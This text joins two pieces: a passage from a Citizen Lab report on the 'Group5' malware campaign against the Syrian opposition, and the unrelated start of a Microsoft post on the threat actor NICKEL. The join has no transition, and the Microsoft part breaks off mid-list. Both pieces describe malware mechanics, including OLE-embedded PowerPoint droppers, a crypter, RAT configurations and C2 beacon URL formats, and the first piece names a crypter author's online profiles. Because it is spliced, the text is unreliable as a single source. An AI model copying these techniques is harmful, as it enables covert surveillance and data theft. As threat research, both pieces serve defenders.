Speculatively, the choice of target is indicative of the interests and resources of a state-level actor, or a group receiving direction or providing information to such an actor. A number of governments and non-state actors in the region have an interest in the workings of the opposition, and several are providing direct or indirect support to the Assad Regime. We discuss this possibility in greater detail below in Evaluating Hypotheses. Hypothesis 2: Known Regime-Linked Group
A known Regime-linked group has modified its tactics to operate against familiar targets

Familiar Targets: The most widely documented threat against the Syrian opposition comes from regime-linked groups, notably malware groups and the Syrian Electronic Army (to a lesser degree). These groups benefit from known links to the regime of Bashar al-Assad, which has a direct and strong interest in monitoring members of the Syrian Opposition, including the groups apparently targeted in this operation. We are familiar with previous operations by regime-linked groups targeting the same organizations.

Modified Tactics: We cannot rule out the possibility that existing groups have added a range of new TTPs to their existing set as the conflict continues. Regime-linked groups certainly have the motivation to conduct this operation. Do known groups have the skills to conduct such an operation? There are a range of features of this operation that suggest Group5 may not be a regime-linked group. First, known regime-linked Syrian groups have tended to use a limited set of C2 servers, almost always with at least one server (or a fallback) located within a narrow set of servers within Syria. Group5 does not have a fallback C2 in Syria. Similarly, the servers that Group5 does use are not from companies previously associated with Syrian regime groups, nor is there any prior evidence of regime-linked groups making use of Persian-language tools, or Iranian IP space. Further, known Syrian groups have been active for almost 5 years without evidence of familiarity with PPSX exploits.

It is unclear why they would deploy so many new tactics all at once, even they continue to gently iterate on techniques familiar to them. Other Syria-Focused Groups? In the introduction we mentioned two other groups that have previously targeted the Syrian opposition: a Lebanon-linked group uncovered in 2014, and an ISIS-linked operation in 2015. The first group, described in a 2015 FireEye Report, coauthored by one of the authors of this report, conducted an extensive campaign against the Syrian opposition. The campaign relied heavily on Arabic-speaking female avatars to flirt with opposition figures and trick them into downloading malware for Windows or Android. That campaign, however, differed in malware tools, infrastructure, and social engineering style from Group5. In addition, it lacked any Persian-language elements, or connection to Iranian IP space. In late 2014 a Citizen Lab report coauthored by one of the authors of this report, identified a malware operation linked to ISIS that targeted Raqqa is Being Slaughtered Silently, a documentation and media group working to uncover human rights abuses in Raqqa and other ISIS-controlled territories.

That malware was apparently custom-made but very unsophisticated. Lacking the functionality of a RAT, and exfiltrating via e-mail, the operation was substantially less sophisticated than Group5’s activities. We think it unlikely that the operator behind that malware has (a) grown much more sophisticated, or (b) begun to rely on Iranian tools and hosting providers. Hypothesis 3: Other Unknown Group
An unknown group, not located in Iran and not linked to prior groups

It is possible that the operation is the work of some other unknown group. One possibility that we consider is that the operation is a false flag from another state sponsor, deliberately crafted to appear to be an Iranian group. In another, we also consider the other common motivations for such operations, including financial crime. A False Flag: Certainly, many other governments are actively interested in information about the Syrian opposition. Given the extensive circumstantial evidence strewn throughout the operation that points to a group based in Iran, one possibility we consider is that the operators are deliberately masquerading as an Iranian group, while acting on behalf of another sponsor.

In such a scenario, each of the pieces of circumstantial evidence we have assembled is a string of deliberately planted artifacts, intended to deflect from the threat actor’s true identity. This hypothesis is an intriguing possibility that cannot be conclusively ruled out. However, it is worth asking why, given the noisiness of existing groups targeting the Syrian opposition, a false flag operation would not simply be populated with the many publicly reported strings and other tools associated with pro-regime groups. Similarly, we wonder why a threat actor sophisticated enough to mount such an operation would not also have used more sophisticated malware or seeding techniques. Financial / Commercial Hacking: We find no evidence to suggest that financial crime or commercial espionage played a part in this operation. For a narrowly focused operation, the targeting, for example, does not appear to be geared towards wealthy individuals, or those with access to serious financial resources.

Evaluating Hypotheses
We have moderate confidence that the best hypothesis is Hypothesis 1: Iranian Group Newly Active in Syria. The Group5 operation shows strong Iranian connections, with few indicators linked to previously reported groups, including Syrian regime-linked groups. The important caveat is that, perhaps partially by design, we have a limited view on the targets of the campaign, and it is possible that this analysis would change. We further believe that Group5 shows some signs of being state-directed, however we do not have sufficient evidence to link Group5 to a particular government. Two possibilities seem likely: (1) Group5 is working under the control or direction of a government entity within Iran, or sympathetic to such an entity and receiving and sharing information with them; (2) Group5 is collaborating or working on behalf of a government entity within Syria for ideological or mercenary reasons. Both governments are belligerents within the Syrian conflict, and both would have a strong interest in accessing the communications of the Syrian opposition.

The Iranian government has been a strong supporter of the regime throughout the conflict, and clearly has an interest in learning and frustrating the political maneuvering of the Syrian opposition. Iranian intelligence and security services have reportedly provided a wide range of military and intelligence gathering assistance to the regime, ranging from troops and training, to electronic monitoring capabilities. At minimum, operators based in Iran certainly would be unlikely to face punishment from their government for work against the Syrian opposition. Speculatively, sponsoring such an operation (held at arm’s length and consigned to a deniable, less experienced group) could provide useful information about the activities and thinking of key individuals within the Syrian Opposition, such as advanced knowledge of negotiating points in multilateral meetings, or internal disagreements. Importantly, there is no evidence to directly connect Group5 to any entities within the Iranian government, security establishment, or military. Nor can we rule out the possibility that Group5 is Iran-based, but working on behalf of some other entity.

The most perplexing part of the activity we observe is that the operation appears to have been extensively prepared, and then apparently paused after initial seeding. This pause took place not long after Al-Ameer was initially targeted: the website development continued for a period after she had received the initial e-mail, and then ceased. Group5 may have initially targeted Al-Ameer hoping to leverage her well-connected position and digital identity to target others within the Syrian opposition. Theft of her digital identity would explain why her name was used in the WHOIS for assadcrimes[.]info, and why, after failing to infect Al-Ameer, the campaign did not appear to receive much further work, and the infrastructure was ultimately abandoned. Other explanations for the pause in activity are possible, and we cannot discount them based on our limited evidence: Group5 may have undergone a shift in the focus of its targeting, concluded that their campaign was ‘blown’ and abandoned it, experienced human resources or political issues, or simply concluded that the operation was using an ineffective technique.

Conclusion
When Syrian opposition figure Noura Al-Ameer sensed something wrong and refrained from clicking, she frustrated a reasonably well put together deception. We suspect she may have been targeted in order to steal her digital identity for the purposes of mounting a larger campaign. Beginning with this initial message, we were able to identify and characterize Group5, a seemingly new entrant into the game. With the identification of Group5, the number of publicly identified operations known to have targeted the opposition with malware has risen to five, at least: Regime-linked groups (Syrian malware groups and the Syrian Electronic Army), a Lebanese Group, ISIS, and most recently Group5. We believe that the most compelling explanation of Group5’s activities is that a group in Iran may be attempting to compromise the communications of the opposition. The circumstantial evidence pointing to an Iranian group is unsurprising, given Iran’s active military engagement in Syria, and the sympathies of many in that country for the Assad regime.

However, mindful of the limits of our investigation, we stop short of conclusive statements of attribution about the identity of the operators, or their possible sponsors. We hope that by publishing this report and sharing indicators, our work will be helpful to other researchers who may see pieces of the puzzle that we do not. Despite the diversity of the groups targeting the Syrian opposition, they share general features: uneven or low technical sophistication plus good social engineering and well-informed targeting. These elements are characteristic of the majority of malware and phishing operations targeting the Syrian opposition over the past several years. The continued targeting, and entry of new groups, reflects the continued weakness in the Syrian opposition’s digital security, and more generally the risks groups face when using popular online platforms for contested political activities. Operators targeting the Syrian opposition plainly do not need sophisticated tools, because easily available malware continues to “work,” when paired with good social engineering.

The technical requirement for entering the game is low, enabling unsophisticated groups to achieve successes, while permitting more advanced groups to conserve better techniques for harder targets. The lack of a centralized communications hierarchy can make opposition groups responsive, and quick to adapt. However, decentralization also provides many opportunities for digital exploitation. Operators can target groups for long periods while remaining unnoticed, without fear of being spotted and blocked by a security team. Even when exploitation attempts are noticed, because the security of these groups relies on the behavior of individuals, it can be extremely difficult to ensure that more secure behaviors are adopted. Opposition groups and their partners face many challenges, and we appreciate the difficulty of securing behavior. The infrastructure that we analyzed is, at time of writing, apparently abandoned. However, we suspect that Group5, or the interests behind it, may be continuing to pursue efforts to target the opposition.

We hope to reinforce the message that continued vigilance is necessary to defend against these operations. Click here for some suggestions about how to improve your digital hygiene. If you believe you may have been targeted by this operation, or other Syrian malware, you are welcome to get in touch with our researchers at submit@citizenlab.ca. Acknowledgements
We thank Noura Al-Ameer for collaborating with this investigation, and for graciously agreeing to be included in this report. The targeted nature of many cases means that, without the help of brave targets and victims, we are often left with a very limited view of what is taking place. We are exceptionally grateful to colleagues at Citizen Lab for comments, critical feedback, and assistance with document preparation including Ron Deibert, Bill Marczak, Morgan Marquis-Boire, Sarah McKune, Masashi Nishihata, Irene Poetranto,Christine Schoellhorn, and Adam Senft. Thanks also to Justin Kosslyn and Brandon Dixon for helpful feedback.

We would also like to thank the following teams: Lookout, PassiveTotal and RiskIQ, VirusTotal, and Cisco’s AMP Threat Grid Team for data correlation. Very special thanks to other investigators who wished to remain anonymous but provided exceptionally helpful assistance, especially TNG and Tuka. Note: the night sky image of Syria used as background for several illustrations is from CIMSS at the University of Wisconsin Madison. Appendix A: Windows Malware Analysis
This section analyzes the malware used by Group5. It walks through the distinct droppers, which range from malicious OLEs in a PowerPoint Slideshow file (PPSX) combined with an exploit, to executable files directly containing malware. Dropper Doc 1 (From E-mail 1)
Assadcrimes.ppsx
MD5: 76F8142B4E52C671871B3DF87F10C30C
This slideshow deploys its malicious payload by (ab)using the OLE object embedding capabilities of PowerPoint.4 Specifically, the malware executable is embedded into the slideshow as an OLE Object of type Package:

Figure 18: Adding an OLE Package to a PowerPoint document
Once embedded, the slideshow “Animation” feature is used to trigger the execution of the object immediately upon viewing the first slide.

In one of the malicious PPSX files, we can see the embedded package object by viewing the slides in normal view mode:

Figure 19: The malicious OLE Package, visible when editing the PPSX
Once activated, the embedded object is saved to disk as %TEMP%\putty.exe, and then executed. This executable is a .Net downloader. Figure 20: showing putty.exe (.Net downloader)
In Figure 20 we can see that the second stage payload is obtained from the URL http://assadcrimes[.]info/1/dvm.exe [Ref 1]. This second stage executable is saved to disk as %temp%\dwm.exe [Ref 2], and then executed [Ref 3]. The %temp%\dwm.exe file has the following hashes:

MD5	SHA256
7d898530d2e77f15f5badce8d7df215e	c19bc1ff5f8472fb7ba64f33c2168b42ea881a6ae6e134a1cc142e984fb6647f
The malware downloaded and executed by the .Net downloader is NanoCore, a well-known RAT (Remote Access Trojan) that enables the remote monitoring of victims via their computers. The NanoCore binary is wrapped using several layers of code obfuscation, which we describe in detail below.

Deobfuscating the Malware
The malware was obfuscated first with crypting, followed by packing before being distributed. Deobfuscating the Malware

We will unwrap these steps in reverse order below. Unpacking
The packer used on this executable employs a simple technique of base64 encoding the PE file and breaking it up into numerous lines which are then embedded into the resource section of the .Net packer stub file. At runtime, the packer reverses this process, then invokes the resulting .Net assembly from memory. Figure 21: Base64 strings found in the resource section of the packed executable. Extracting this packed code reveals a .Net assembly which is yet another layer of code protection applied using a ‘crypter’. This binary has the following hashes:

MD5	SHA256
a4f1f4921bb11ff9d22fad89b19b155d	d81ec563387e2ea47bc8ed50fd36e1de955cb2331d6eaae9f966b5d7ab094806
Decrypting
This executable is stub code which performs in-memory AES decryption of a base64 encoded string variable. This string variable holds an encrypted copy of the NanoCore RAT binary.

Figure 22: the AES decryption routines
This encryption of the underlying malware is typically employed to bypass detection by endpoint security controls such as antivirus programs. Many ‘crypter’ tools, as they are known, are available for purchase or trade on various hacking forums. Of particular note, this decrypting stub code retained its PDB (short for Program Database) information. PDB file references are common in .Net applications when compiled in ‘debug’ mode, and they frequently reveal the original file path of the application source code on the developer’s computer. This executable revealed the following PDB file path:

c:\users\mr.tekide\documents\visual studio 2013\projects\paccryptnano core dehgani -vds\windowsapplication2\obj\debug\launch manager.pdb
This PDB string indicates that ‘mr.tekide’ was the username of the developer who compiled this particular stub, and further that it was compiled as part of a Visual Studio project named ‘paccryptnano core dehgani -vds’. In addition, a single subroutine found inside the decrypting stub was named ‘tekide’.

The relevance of this PDB string was discussed above in Part 5: Attribution. In order to obtain the intended malware payload from this decrypting stub executable, we created a small .Net application to mimic the decryption steps and output the file to disk. Once complete, we obtained a malicious executable with hashes:

MD5	SHA256
dd5bedd915967c5efe00733cf7478cb4	a9db5a548ea17d6606bfbdb20306a3a08b38dbfe720f9f709f4d3369288be104
Original NanoCore binary
Now that we have arrived at the original NanoCore binary, we can examine the configuration as specified by the operator. In order to extract the configuration settings from this copy of NanoCore, we used Kevin Breen’s RATDecoders. Using Breen’s tool we arrived at the following configuration:

Figure 23: The NanoCore configuration, using Kevin Breen’s RATDecoders
Notably, 88.198.222[.]163 port 8081 is the command and control channel for this malware. As noted in Part 1, the same IP was also present in the seeding e-mail header. Dropper Doc 2
assadcrimes1.ppsx
MD5:F1F84EA3229DCA0CCACB7381A2F49F99
This PowerPoint document leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system.

As described in previous reporting, this vulnerability causes a file embedded within the PowerPoint document to be copied to disk and executed silently on vulnerable systems. The document under examination drops a file named dvm.gif to disk, renames it to dvm.exe and then executes it. This dvm.exe is the same packed and crypted copy of NanoCore as retrieved and executed by the .Net downloader described in the previous section. Dropper Doc 3
assadcrimes.info.ppsx
MD5: 30BB678DB3AD0140FC33ACD9803385C3
This malicious PowerPoint document uses the same weaponization method described above with respect to Dropper Doc 1. The executable is embedded as an OLE package object, and subsequently executed using animation actions within the PowerPoint slideshow. Figure 24: The malicious OLE Package, visible when editing the PPSX
As with Dropper Doc 1, activation of the OLE Package object saves the embedded executable to disk as %TEMP%\putty.exe, then executes it. This file is a .Net application employing the same layers and methods of packing and crypting as seen in the payloads delivered by Dropper Docs 1 and 2.

However, the ultimate malware payload in this case is njRat, another well-known RAT tool. After unpacking the OLE embedded executable putty.exe, we again arrive at a decrypting stub file which will AES decrypt a base64 string variable and run it from memory. The hashes of this file are:

MD5	SHA256
6161083021b695814434450c1882f9f3	d72676bbf8de82486c3cebfdad2961cc68a6b564a43f9f987c95320fcd6a330a
Similar to the case of Dropper Doc 1 above, we find a PDB entry present in the decrypting stub executable:

C:\Users\mr.tekide\Documents\Visual Studio 2013\Projects\paccrypt11njratmalii\paccryptalipnahzade\obj\Debug\LManager.pdb
Again we can observe the same username of ‘mr.tekide’ in the project source code path within the PDB string. Further, we note the development path components paccrypt11njratmalii and paccryptalipnahzade. To obtain the malicious njRat executable from this decrypting stub we used the same .Net program we built for use in the Dropper Doc 1 example above. The resulting njRat binary had the following hashes:

MD5	SHA256
b4121c3a1892332402000ef0d587c0ee	1a287331e2bfb4df9cfe2dab1b77c9b5522e923e52998a2b1934ed8a8e52f3a8
Interestingly, the njRat executable appears to have been compiled from source by the same user who compiled the crypter described above.

Note the PDB strings found inside the njRat executable:

C:\Users\mr.tekide\Documents\Visual Studio 2013\Projects\njrat7stubsoures – Copy\njrat7stubsoures\obj\Debug\dvvm.pdb
A quick look at the configuration data embedded within this njRat binary reveals the command and control IP address and port:

Figure 25: The njRAT configuration, showing the C2 and port. Decoy Dropper 4
alshohadaa alatfal.exe
MD5: 2FC276E1C06C3C78C6D7B66A141213BE
This file is a .Net application designed to act as a decoy by displaying a window depicting images of dead children (see Figure: 5). While displaying these images, the decoy application also silently extracts an executable file from the .Net assembly’s resource section, copies it to %TEMP%\dvm.exe, and then launches a new process from this newly created file. See Figure 26 below:

Figure 26: Malware dropping code inside the Decoy application
The dropper also includes a PDB reference:

C:\users\enterok\desktop\slideshow\slideshow\obj\x86\debug\alshohadaa alatfal.pdb
The dvm.exe file is itself a .Net executable which is packed using the same .Net packer used above in the cases of Dropper Docs 1 – 3.

Once unpacked, the resulting file is the same crypted .Net application analysed above from Dropper Doc 3, having MD5 hash 6161083021b695814434450c1882f9f3, and containing the njRat payload. Malware Infrastructure
Command and Control Server
Each of the three distinct RAT tools used by Group5 (njRAT, NanoCore RAT, and DroidJack) were configured to communicate with a single command and control server operating on IP address 88.198.222[.]163. IP	Reverse DNS PTR	Assignee
88.198.222[.]163	static.88-198-222-163.clients.your-server.de	HETZNER-RZ-NBG-BLK4
Hetzner Online GmbH
This server was the sole point of data exfiltration for each of the malware components. As detailed above for njRAT and NanoCore, and below in Appendix B for DroidJack, the TCP ports used for command and control for each of the RAT tools were as follows:

Figure 27: RAT ports on the C2 server
Additionally, we believe a controller for yet another remote access trojan, XpertRAT, was also hosted on this IP in November 2015; however, we did not uncover any samples designed to communicate with this XpertRAT controller.

As noted in the above table, the IP address 88.198.222[.]163 is assigned to Hetzner Online, a Germany based web hosting provider. Hetzner offers web hosting services as well as virtual and dedicated server rentals. Contact was made with Hetzner technical personnel subsequent to the discovery of the malicious activity outlined in this report. A synopsis of this contact is provided in Appendix F: Notification. Current data available for this IP address suggests that it was likely reprovisioned to a different Hetzner customer in early February 2016 at the latest, and then possibly again in May. A series of domain names associated with online multi-player games were directed to this Hetzner IP, one of which was apparently hosting a malicious HTML document. Assadcrimes Web Hosting
The assadcrimes[.]info domain name was registered in June 2015, but it remained parked until early October, at which time it was migrated to an Iran-based shared web hosting provider named Hostnegar.

This action coincided with the delivery of the initial e-mails outlined in Part 1. The assadcrimes[.]info website was hosted on a shared hosting platform, and as such the IP address associated was also shared by a significant number of other, unrelated, websites. IP	Reverse DNS PTR
212.7.195[.]171	server22.rayanegarco[.]com
Headers from the initial e-mail are shown below in Figure 28. These headers indicate that the initial e-mail was most likely sent using the Horde webmail application running on the web hosting server. Furthermore, the headers indicate that the sender was accessing the webmail application from the IP address of the command and control server discussed above. Figure 28: Headers from the initial e-mail 
Finally, available domain name service data indicates that the assadcrimes[.]info domain name was moved back to its original parked location on May 4, 2016. Appendix B: Android Malware Analysis
The Malicious APK – Overall Description
Figure 29: The malicious application is installed, and appears in the Apps tab (left), while hidden from the Apps list from the Drawer (right)	Figure 29: The malicious application is installed, and appears in the Apps tab (left), while hidden from the Apps list from the Drawer (right)
Figure 29: The malicious application is installed, and appears in the Apps tab (left), while hidden from the Apps list from the Drawer (right)

Upon execution, the malware is installed and then hidden from the list of installed applications in order to remain covert.

Figure 30 : The malicious app gives an error ‘App isn’t installed’ when the user tries to open the malware before it disappears from the list. After the installation, the Application icon will be removed from the installed applications list, yet it will still be running in the background. The APK package in question had the following characteristics:

Adobe_Flash_Player.apk
MD5: 8EBEB3F91CDA8E985A9C61BEB8CDDE9D
This APK is an instance of DroidJack. According to Symantec, this application evolved from an older codebase known as SandroRAT. The discovered APK sample also contains references to both names, as shown in Figure 31 below:

38a-figure-31-references	38b-figure-31-references
Figure 31: References to both DroidJack and SandroRat as seen in the source code

The APK Manifest file reveals important information about the sample’s capabilities and the intentions of its operator. The Android operating system requires information from the Manifest file before the application can execute. This application will request the following permissions and use the following features from the device:

Figure 32: screenshot from Manifest file with the requested permissions for the APK
In the Android system, Activities are components typically used to let the user of the device perform an action.

The Main Activity is also defined in the Manifest, pictured in Figure 33. Figure 33: Main activity defined in the manifest
In this case, the Main Activity is designed to start the Controller as a Service and finish. The controller will be discussed in more detail in the next section. Android applications can also have Services and Receivers defined. Services are used for background operations while Receivers define the types of broadcast messages the application can receive from other applications as well as the device. These messages are known as Intents. This APK sample enables several services including “Controller,” “GPSLocation” and “Toaster” (See Figure 34). Figure 34: Services enabled by the APK
The Controller class, referred to by the Main Activity and started as a service on the device, handles the malware operator’s interaction with the application while the GPSLocation class is responsible for obtaining the GPS position from the device’s LocationManager.

The Toaster class is not implemented in this APK; however, it is implemented in older SandroRAT samples. The APK file has several Receiver classes defined to handle specific messages from the device (See Figure 35). Figure 35: Defined receiver classes
 

Receiver Intent	Usage
Connectivity Change	Allows the application to monitor any connectivity changes, including moving between mobile data and Wi-Fi. The constant value is set every time a change occurs. Boot Completed	Allows the application to re-connect when the device restarts. The constant value is broadcast when the device finishes booting. Phone State	Allows the application to monitor incoming calls. The constant value is set when the call state is changed. The Connector Receiver simply starts the Controller Service when the phone boots allowing the malware to run in the background upon start up. The CallListener Receiver allows the operator to log when the target makes calls, and record calls (if the operator has enabled it) as an .amr file that can then be sent to the command and control server.

Lastly, in the Manifest file, the Application enables two additional Activities, “CAMSNAP” and “VIDEOCAP,” as shown in Figure 36. Figure 36: Activities enabling camera and video capture
These allow the operator to use the infected device’s camera to take pictures and record video. This activity is hidden from the victim using a translucent theme. The Malicious APK – The Controller
As previously mentioned, the Controller class is ultimately responsible for the rest of the functionality. The instance we analyzed was configured to use the same host as the Windows malware for command and control communication: 88.198.222[.]163. Figure 37: DroidJack configuration showing that it shares a host with the other Group5 malware
We were able to install a test instance to learn how the malware’s operator could surveil victims. It is clear that the operator would have nearly full access to the victim’s information. Features offered include:

File browsing
SMS and call logging
Contacts
Browser history
Application Manager
Location history
WhatsApp Reader (only works on rooted devices)
Remote camera and microphone
Figure 38: DroidJack browsing WhatsApp logs for an infected device.

Some features will only work on rooted devices. For example, the ability to read WhatsApp messages requires the victim’s device to be rooted. Android apps are unable to access the data from other applications unless they are signed with the same certificate or if the app has been given permission to execute commands as root. If DroidJack is able to acquire root access it can then upload the database on the device where WhatsApp stores its message history. Appendix C: Mr. Tekide
This appendix provides more context on Mr. Tekide, first delving into how we have identified his crypter (PAC Crypt) in strings in the binaries, and second highlighting the results of open source searching for his aliases and related strings. Sample Correlation With PDB Strings
In the Group5 malware samples, we have several PDB file references that suggest that the crypter used with the two distinct RAT tools (njRat and NanoCore) was Mr.

Tekide’s ‘PAC Crypt’. For the njRat sample from Dropper Doc 3, we can see the malware stub was compiled by ‘mr.tekide’ as well. Reference: Doc Dropper 1 Crypter	MD5: a4f1f4921bb11ff9d22fad89b19b155d	Compile Time: 9/30/2015 00:02:51
c:\users\mr.tekide\documents\visual studio 2013\projects\paccryptnano core dehgani -vds\windowsapplication2\obj\debug\launch manager.pdb
 

Reference: Doc Dropper 3 Crypter	MD5:6161083021b695814434450c1882f9f3	Compile Time: 10/6/2015 02:13:45
C:\Users\mr.tekide\Documents\Visual Studio 2013\Projects\paccrypt11njratmalii\paccryptalipnahzade\obj\Debug\LManager.pdb
 

Reference: Doc Dropper 3 njRat Payload	MD5:b4121c3a1892332402000ef0d587c0ee	Compile Time: 10/6/2015 01:23:31
C:\Users\mr.tekide\Documents\Visual Studio 2013\Projects\njrat7stubsoures – Copy\njrat7stubsoures\obj\Debug\dvvm.pdb
 

The Visual Studio project folders listed above suggest the particular version of PAC Crypt compiled by Mr. Tekide was being prepared in one case for an njRat payload, and another for a NanoCore payload. The strings ‘dehgani –vds’, ‘malii’ and ‘alipnahzade’ may have additional significance or relevance. We conducted searches across online malware repositories and analysis services (such as VirusTotal, Malwr, and TotalHash) in an effort to acquire additional data relating to the use of PAC Crypt. These searches revealed very little in relation to PAC Crypt specifically, so we instead examined the data for instances of ‘tekide’ related strings found in PDB files.

It is our hope that the data or avenue of investigation presented below may be of value to other researchers. The results we examined contained over 200 samples which we then clustered into sets based on compile time and PDB reference as shown in the table below:

We examined contained over 200 samples which we then clustered into sets based on compile time and PDB reference as shown in the table

The following compile time / PDB references were also observed in singular instances:

Compile time / PDB references were also observed in singular instances

Keeping in mind the limitations of reliance on compile times, we nevertheless were able to compare the noted compile times against the first time samples appeared in common malware repositories such as VirusTotal, Malwr, and TotalHash. In most instances, samples began to appear in malware repositories within hours of the files being compiled. Dynamic analysis of the samples in these sets revealed multiple different payloads and C2 configurations.

For example, analysis of the samples in Set A yielded the following payloads and configurations:

analysis of the samples in Set A yielded the following payloads and configurations

Finally, analysis of the compile times observed across the acquired samples suggest a period of activity falling in the latter half of 2014. There are many possible explanations as to why so few samples were observed with compile times beyond 2014: conscious removal of PDB information, a change in personal circumstances, or possibly even a shift to less public malware development activities. Mr. Tekide on the Internet
Mr. Tekide maintains a visible profile across various malware related web forums, as well as on social media. Searches conducted for this alias provided numerous results which reveal a consistent use of the Mr. Tekide name and avatar, as shown in the images below. Figure 39: Mr. Tekide showcasing his ‘ashiyane crypter v.7’ on the Ashiyane forums
 

Figure 40: Mr.Tekide’s administrator profile on the crypter[.]ir forums
Figure 41: PAC Crypt page on the crypter[.]ir online shop
A link found on the ‘Contact’ page of the crypter[.]ir website led to a Facebook profile in the name of ‘Pezhman Blackhat.’ In addition to this Facebook profile, we also identified a LinkedIn profile in which he refers to himself as a ‘crypter,’ and states that he works for the ashiyane digital security team.

He also maintains an Instagram profile. Appendix D: File Hashes
Full Table of Binaries
File	MD5	VirusTotal (26-Jul-2016)	First Sub. on VT
Dropper Doc 1			
assadcrimes.ppsx	76F8142B4E52C671871B3DF87F10C30C	N/A	N/A
putty.exe [stage1 downloader]	366908F6C5C4F4329478D60586ECA5BC	N/A	N/A
dvm.exe [stage 2 payload]	7D898530D2E77F15F5BADCE8D7DF215E	N/A	N/A
Unpacked dvm.exe	A4F1F4921BB11FF9D22FAD89B19B155D	N/A	N/A
NanoCore RAT payload	DD5BEDD915967C5EFE00733CF7478CB4	N/A	N/A
Dropper Doc 2			
assadcrimes1.ppsx	F1F84EA3229DCA0CCACB7381A2F49F99	N/A	N/A
dvm.exe	7D898530D2E77F15F5BADCE8D7DF215E	N/A	N/A
Dropper Doc 3			
assadcrimes.info.ppsx	30BB678DB3AD0140FC33ACD9803385C3	N/A	N/A
putty.exe	5C4EC3D93A664E4BFA1CE6286CCF0249	N/A	N/A
Unpacked putty.exe	6161083021B695814434450C1882F9F3	N/A	N/A
njRAT payload	B4121C3A1892332402000EF0D587C0EE	N/A	N/A
Decoy Dropper 4			
alshohadaa alatfal.exe [decoy app]	2FC276E1C06C3C78C6D7B66A141213BE	N/A	N/A
dvm.exe [dropped by decoy app]	494BAB7FD0B42B0B14051ED9ABBD651F	14 / 55	2-Mar-2016
Unpacked dvm.exe	6161083021B695814434450C1882F9F3	N/A	N/A
njRAT payload	B4121C3A1892332402000EF0D587C0EE	N/A	N/A
Android Malicious APK (DroidJack)			
adobe_flash_player.apk	8EBEB3F91CDA8E985A9C61BEB8CDDE9D	23 / 53	5-Jul-2016

The Microsoft Threat Intelligence Center (MSTIC) has observed NICKEL, a China-based threat actor, targeting governments, diplomatic entities, and non-governmental organizations (NGOs) across Central and South America, the Caribbean, Europe, and North America. MSTIC has been tracking NICKEL since 2016 and observed some common activity with other actors known in the security community as APT15, APT25, and KeChang. Today, the Microsoft Digital Crimes Unit (DCU) announced the successful seizure of a set of NICKEL-operated websites and disruption of their ongoing attacks targeting organizations in 29 countries, following a court order from the U.S. District Court for the Eastern District of Virginia granting Microsoft the authority to seize these sites. MSTIC has tracked the current NICKEL operations, including attacks against government organizations, diplomatic entities, and NGOs, since September 2019. During this time, NICKEL activity has been observed across several countries, with a large amount of activity targeting Central and South American governments.

Notably, NICKEL has achieved long-term access to several targets, allowing NICKEL to conduct activities such as regularly scheduled exfiltration of data. As China’s influence around the world continues to grow and the nation establishes bilateral relations with more countries and extends partnerships in support of China’s Belt and Road Initiative, we assess that China-based threat actors will continue to target customers in government, diplomatic, and NGO sectors to gain new insights, likely in pursuit of economic espionage or traditional intelligence collection objectives. Portions of the NICKEL activity we are highlighting have also been blogged about by our colleagues at ESET. Map showing countries targeted by NICKEL attacks

Figure 1: NICKEL targeted countries: Argentina, Barbados, Bosnia and Herzegovina, Brazil, Bulgaria, Chile, Colombia, Croatia, Czech Republic, Dominican Republic, Ecuador, El Salvador, France, Guatemala, Honduras, Hungary, Italy, Jamaica, Mali, Mexico, Montenegro, Panama, Peru, Portugal, Switzerland, Trinidad and Tobago, United Kingdom, United States of America, Venezuela

As with any observed nation-state actor activity, Microsoft continues to notify customers that have been targeted or compromised, providing them with the information they need to help secure their organizations.

To reduce the potential impact of this NICKEL activity, Microsoft encourages our customers to immediately review the activity and guidance below, then implement risk mitigations, harden environments, and investigate suspicious behaviors that match the tactics described in this blog. MSTIC will continue to observe, monitor, and notify affected customers and partners, when possible, through our nation-state notification process. Observed activity
MSTIC has observed NICKEL actors using exploits against unpatched systems to compromise remote access services and appliances. Upon successful intrusion, they have used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts. NICKEL actors created and deployed custom malware that allowed them to maintain persistence on victim networks over extended periods of time. MSTIC has also observed NICKEL perform frequent and scheduled data collection and exfiltration from victim networks. NICKEL successfully compromises networks using attacks on internet-facing web applications running on unpatched Microsoft Exchange and SharePoint.

They also attack remote access infrastructure, such as unpatched VPN appliances, as referenced in the FireEye April 2021 blog detailing a 0-day vulnerability in Pulse Secure VPN that has since been patched. After gaining an initial foothold on a compromised system, the NICKEL actors routinely performed reconnaissance on the network, working to gain access to additional accounts or higher-value systems. NICKEL typically deployed a keylogger to capture credentials from users on compromised systems. We’ve observed NICKEL using Mimikatz, WDigest (an older authentication method that allows the attacker access to credentials in clear text), NTDSDump, and other password dumping tools to gather credentials on a targeted system and from target browsers. Deploying malware for command and control
MSTIC tracks multiple malware families used by NICKEL for command and control as Neoichor, Leeson, NumbIdea, NullItch, and Rokum. The Leeson, Neoichor, and NumbIdea malware families typically use the Internet Explorer (IE) COM interface to connect and receive commands from hardcoded C2 servers.

Due to their reliance on IE, these malware families intentionally configure the browser settings by modifying the following registry entries:

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
Start Page = “about:blank”
DisableFirstRunCustomize = 1
RunOnceComplete = 1
RunOnceHasShown = 1
Check_Associations = 1

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Recovery]
AutoRecover = 0

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy]
ClearBrowsingHistoryOnExit = 1

[HKEY_CURRENT_USER\Software\Microsoft\Internet Connection Wizard]
Completed = 1

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap]
IEHarden = 0

When connecting to the C2 servers, the URL requests follow these formats:

http[:]//<C2>?id=<5-digit-rand><system-specific-string>
http[:]//<C2>?setssion==<rand><GetTickCount>
http[:]//<C2>?newfrs%dsetssion=<rand><GetTickCount>
http[:]//<C2>/index.htm?content=<base64-system-specifc-string>&id=<num>

A typical response from the C2 server is a legitimate-looking webpage containing the string “!DOCTYPE html”, which the malware checks. The malware then locates a Base64-encoded blob, which it decodes and proceeds to load as a shellcode. For the Neoichor family, the malware checks for internet connectivity by contacting bing.com with the request format bing.com?id=<GetTickCount> and drops files as ~atemp and ~btemp containing error codes and debug resources. The NICKEL implants are backdoors capable of collecting system information, such as:

IP address
OS version
System language ID
Computer name
Signed-in username
They implement basic backdoor functionalities, including:

Launching a process
Uploading a file
Downloading a file
Executing a shellcode in memory
MSTIC has observed NICKEL drop their malware into existing installed software paths.

They did this to make their malware appear to be files used for an installed application. The following are example paths:

